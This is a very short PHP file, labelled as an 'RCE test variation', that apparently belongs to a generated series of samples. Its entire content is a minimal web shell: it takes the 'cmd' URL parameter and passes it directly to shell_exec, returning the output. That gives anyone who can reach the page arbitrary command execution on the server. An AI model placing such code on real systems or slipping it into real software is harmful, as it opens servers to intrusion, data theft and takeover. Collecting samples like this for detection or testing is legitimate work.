<?php
// RCE test variation #1228
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>